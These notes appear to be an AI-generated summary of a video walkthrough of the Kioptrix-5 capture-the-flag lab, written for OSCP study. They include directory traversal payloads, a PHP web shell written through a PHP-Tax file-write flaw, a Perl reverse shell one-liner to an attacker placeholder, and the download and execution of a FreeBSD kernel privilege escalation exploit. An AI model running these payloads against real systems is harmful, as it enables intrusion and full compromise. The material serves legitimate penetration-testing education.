That is a walkthrough of the **Kioptrix-5** machine by **S1REN** from the OffSec team, a great resource for OSCP preparation.

Here are the comprehensive notes and key commands, structured by the stages of the penetration test, as demonstrated in the video:

***

## 1. Initial Access & Enumeration

The target machine is running **FreeBSD 9**, which is a crucial piece of information for later stages.

| Stage | Command/Tool | Description | Context/Notes | Timestamp |
| :--- | :--- | :--- | :--- | :--- |
| **VM Boot Fix** | `mount root ufs ada0p2` | Command to manually mount the root partition, needed for this specific VM. | Use this if the Kioptrix 5 VM hangs on the `mount root` prompt. | [[07:41](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=461)] |
| **Port Scanning** | `nmap -p- -sV -sC [target_ip] --open` | Full port scan, service version detection, and default scripts, only outputting open ports. | **Ports Open:** **80 (HTTP)**, **8080 (HTTP)**. Services include **PHP 5.3.8** and **OpenSSL 0.9.8q** on a **FreeBSD** OS. | [[23:20](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=1400)] |
| **Web Discovery** | `wpscan` or `ffuf`/`gobuster` (Wfuzz used in video) | Directory/file fuzzing revealed limited initial results, leading to manual web application inspection. | Look for **robots.txt**, **.svn entries**, **.git folders**, and check the root directories of all web ports. | [[27:36](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=1656)] |
| **Source Analysis** | **View Page Source** (in browser) | Examining the source code of the index page revealed the location of the main application. | **Key Discovery:** The web application is located at `/pChart2.1.3/index.php`. | [[36:14](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=2174)] |

***

## 2. Exploitation: Directory Traversal & Attack Surface Discovery

The vulnerability in the `pChart` application allowed for directory traversal, which was used not just to get user information, but to uncover a secondary, hidden attack surface.

### Directory Traversal

| Target File | Command/Payload (Example) | Result | Timestamp |
| :--- | :--- | :--- | :--- |
| **Users** | `.../index.php?action=view&script=../../../../../../../../etc/passwd` | **Success:** Retrieved local user accounts: `ossec`, `ossec-m`, and `ossec-r`. | [[39:47](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=2387)] |
| **Hidden Config** | `.../index.php?action=view&script=../../../../../../../../usr/local/etc/apache22/httpd.conf` | **Success:** Retrieved the **Apache HTTPD configuration file** for the FreeBSD system. | [[59:28](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=3568)] |

### Key Concept: LFI vs. Directory Traversal [[45:37](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=2737)]

The video emphasizes the critical difference between **Local File Inclusion (LFI)** and **Directory Traversal**:

* **Directory Traversal (or Path Traversal):** The application reads the contents of the file and **displays it as text** in the browser. You see the source code/raw content. (This is what pChart 2.1.3 was vulnerable to).
    * **Advantage:** Allows you to **read sensitive files** like configuration files (`httpd.conf`) to find credentials or application logic.
* **Local File Inclusion (LFI):** The application **executes the file's native code** (e.g., PHP, Python, or shell script) and then displays the output.
    * **Advantage:** Can lead to **Remote Code Execution (RCE)** by including a shell or by poisoning a log file.

### Finding a Second Attack Surface

Analysis of the `httpd.conf` file revealed a security restriction on the **8080 port** (the initial forbidden page), which required a specific **User-Agent** header to allow access.

| Action | Tool/Technique | Result | Timestamp |
| :--- | :--- | :--- | :--- |
| **Bypass Restriction** | **Burp Suite Match and Replace** | Configured Burp Suite to automatically replace the outgoing User-Agent with a permitted value (e.g., **Mozilla/**). | [[01:04:32](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=3872)] |
| **New Surface** | Browse to `http://[target_ip]:8080/` | **Success:** The hidden application at `/data2/` running **PHP-Tax** was revealed. | [[01:07:54](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=4074)] |

***

## 3. Exploitation: Remote Code Execution (RCE) and Shell

The newly discovered PHP-Tax application had a known **Remote Code Execution (RCE)** vulnerability.

| Stage | Command/Payload | Description | Timestamp |
| :--- | :--- | :--- | :--- |
| **Web Shell Write** | `index.php?action=write&new_value=<?php passthru($_GET[cmd]);?>&filename=../data/ossec.php` | The exploit abuses a file-write function to plant a simple PHP web shell called `ossec.php` in the accessible `/data/` directory. (Note: The payload needs to be **URL-encoded** before sending). | [[01:12:40](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=4360)] |
| **RCE Confirmation** | `http://[target_ip]:8080/data/ossec.php?cmd=id` | Confirmed RCE as the **www** user by executing the `id` command. | [[01:14:44](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=4484)] |
| **Netcat Listener** | `nc -nlvp 9090` | Set up a local netcat listener to catch the reverse shell connection. | [[01:16:21](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=4581)] |
| **Reverse Shell** | Execute a **Perl** reverse shell (or similar payload) via the webshell's `cmd` parameter: `...ossec.php?cmd=perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'` | Established a low-privilege shell on the target machine as `www`. | [[01:16:29](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=4589)] |

***

## 4. Privilege Escalation (PrivEsc)

Since the reverse shell was a limited **www** user, the next step was to find a local privilege escalation vector.

| Stage | Command/Tool | Description | Context/Notes | Timestamp |
| :--- | :--- | :--- | :--- | :--- |
| **OS Info** | `uname -a` | Confirmed the target is **FreeBSD Kioptrix 2014.9** (based on **FreeBSD 9**). This is critical for finding the right exploit. | **Takeaway:** Always know your target OS and kernel version to narrow down exploitation options. | [[01:30:01](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=5401)] |
| **File Transfer** | `fetch http://[attacker_ip]:8000/ossec.c` | **FreeBSD's native file download utility** (analogous to `wget` or `curl`). Used to download the exploit source code (`ossec.c`) hosted by the attacker's simple web server (`python3 -m http.server 8000`). | **Takeaway:** Learn the native tools for non-Linux systems (e.g., `fetch` on FreeBSD, `tftp` on some older boxes). | [[01:36:22](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=5782)] |
| **Exploit Compilation** | `gcc ossec.c -o ossec` | Compiled the C-based kernel exploit directly on the target machine. | **Takeaway:** If the target has a compiler (`gcc`), always compile locally for guaranteed compatibility with the target's architecture (`x86_64`). | [[01:36:57](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=5817)] |
| **Execution** | `./ossec` then `id` | Executed the compiled exploit, which successfully escalated the current user's privileges to **root**. | **Exploit Used:** **Intel SYSRET Kernel Privilege Escalation** (FreeBSD 9.0) | [[01:37:47](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=5867)] |
| **Final Flag** | `cat /root/congrats.txt` | Read the final confirmation/flag file after obtaining a root shell. | [[01:38:23](http://www.youtube.com/watch?v=GBSWd_2fw3s&t=5903)] |

***

## 🔑 Summary of OSCP Key Concepts

1.  **Know Your Target OS:** The FreeBSD OS guided decisions at every stage (fetch tool, lack of `bash`, and specific kernel exploit).
2.  **LFI vs. Traversal:** Understand the difference: **Traversal** means reading the raw file content (good for config files); **LFI** means executing the code (good for RCE).
3.  **Find the Second Surface:** If a web server has multiple ports or directories, look for configuration files (`httpd.conf` on FreeBSD) to bypass restrictions and find hidden attack paths.
4.  **Local Compilation:** If a compiler is present on the target, **always compile the exploit locally** to avoid cross-compilation errors.

[Link to the video: Kioptrix-5 with S1REN](http://www.youtube.com/watch?v=GBSWd_2fw3s)
http://googleusercontent.com/youtube_content/0